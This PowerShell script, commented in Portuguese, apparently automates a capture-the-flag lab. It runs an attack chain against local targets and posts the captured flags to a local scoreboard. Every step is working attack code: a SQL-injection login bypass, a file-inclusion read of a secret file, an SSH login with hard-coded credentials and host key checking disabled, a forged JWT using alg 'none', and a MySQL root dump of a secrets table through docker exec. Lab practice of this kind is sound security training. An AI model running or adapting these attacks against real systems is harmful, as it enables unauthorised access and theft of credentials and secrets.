# OZZ — Attack Chain (Windows PowerShell)
# Executa a cadeia completa de ataque contra os targets
# Uso: .\attack.ps1

$ErrorActionPreference = "Continue"
$SCOREBOARD = "http://localhost:9090"

Write-Host ""
Write-Host "  ╔══════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "  ║  🏴 OZZ — FULL ATTACK CHAIN                  ║" -ForegroundColor Green
Write-Host "  ║  Capturing all 5 flags                       ║" -ForegroundColor Green
Write-Host "  ╚══════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host ""

$flagsFound = 0

function Submit-Flag {
    param($flag, $source)
    Write-Host "  🚩 FLAG: $flag" -ForegroundColor Green
    Write-Host "  📤 Submitting..." -ForegroundColor Cyan
    try {
        Invoke-WebRequest -Uri "$SCOREBOARD/submit" -Method POST -Body @{flag=$flag; agent="Ozz"} -UseBasicParsing | Out-Null
        Write-Host "  ✅ Submitted" -ForegroundColor Green
    } catch {
        Write-Host "  ⚠️ Submit failed" -ForegroundColor Yellow
    }
    $script:flagsFound++
    Write-Host ""
}

# === TARGET-01 ===
Write-Host "━━━ TARGET-01: Web (localhost:8081) ━━━" -ForegroundColor Yellow
Write-Host "[1] SQLi login bypass..." -ForegroundColor Cyan
try {
    $r = Invoke-WebRequest -Uri "http://localhost:8081/?page=login" -Method POST -Body @{username="admin'--"; password="***"} -UseBasicParsing
    if ($r.Content -match "admin|welcome") {
        Write-Host "  ✅ SQLi successful" -ForegroundColor Green
    }
} catch { Write-Host "  ❌ Connection failed" -ForegroundColor Red }

Write-Host "[2] LFI for flag..." -ForegroundColor Cyan
try {
    $r = Invoke-WebRequest -Uri "http://localhost:8081/?page=reports&file=/var/secret/flag.txt" -UseBasicParsing
    if ($r.Content -match "flag\{[^}]+\}") {
        Submit-Flag $Matches[0] "TARGET-01"
    }
} catch { Write-Host "  ❌ LFI failed" -ForegroundColor Red }

# === TARGET-02 ===
Write-Host "━━━ TARGET-02: SSH (localhost:2222) ━━━" -ForegroundColor Yellow
Write-Host "[1] SSH with admin:password123..." -ForegroundColor Cyan
try {
    $sshResult = & sshpass -p password123 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p 2222 admin@localhost "cat /home/admin/flag.txt" 2>$null
    if ($sshResult -match "flag\{[^}]+\}") {
        Submit-Flag $Matches[0] "TARGET-02"
    }
} catch { Write-Host "  ⚠️ SSH not available" -ForegroundColor Yellow }

# === TARGET-03 ===
Write-Host "━━━ TARGET-03: API (localhost:5000) ━━━" -ForegroundColor Yellow
Write-Host "[1] Login + JWT bypass..." -ForegroundColor Cyan
try {
    $header = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"alg":"none","typ":"JWT"}')).TrimEnd('=').Replace('+','-').Replace('/','_')
    $payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"user":"admin","role":"admin"}')).TrimEnd('=').Replace('+','-').Replace('/','_')
    $forgedToken = "$header.$payload."

    $r = Invoke-WebRequest -Uri "http://localhost:5000/admin/secrets" -Headers @{Authorization="Bearer $forgedToken"} -UseBasicParsing
    if ($r.Content -match "flag\{[^}]+\}") {
        Submit-Flag $Matches[0] "TARGET-03"
    }
} catch { Write-Host "  ⚠️ API attack failed" -ForegroundColor Yellow }

# === TARGET-04 ===
Write-Host "━━━ TARGET-04: MySQL (10.0.0.40) ━━━" -ForegroundColor Yellow
Write-Host "[1] MySQL via docker exec..." -ForegroundColor Cyan
try {
    $mysqlResult = & docker exec target-02 mysql -h 10.0.0.40 -u root -p"MySQL_R00t_2026!" -e "USE corporate; SELECT secret_key, secret_value FROM internal_secrets;" 2>$null
    if ($mysqlResult -match "flag\{deep_vault[^}]+\}") {
        Submit-Flag $Matches[0] "TARGET-04"
    }
    if ($mysqlResult -match "flag\{halctf[^}]+\}") {
        Submit-Flag $Matches[0] "TARGET-04"
    }
} catch { Write-Host "  ⚠️ MySQL not reachable" -ForegroundColor Yellow }

# === REPORT ===
Write-Host ""
Write-Host "  ╔══════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "  ║  🏴 ATTACK COMPLETE                          ║" -ForegroundColor Green
Write-Host "  ╚══════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host "  Flags: $flagsFound/5" -ForegroundColor White
Write-Host "  Scoreboard: $SCOREBOARD" -ForegroundColor Cyan
Write-Host ""
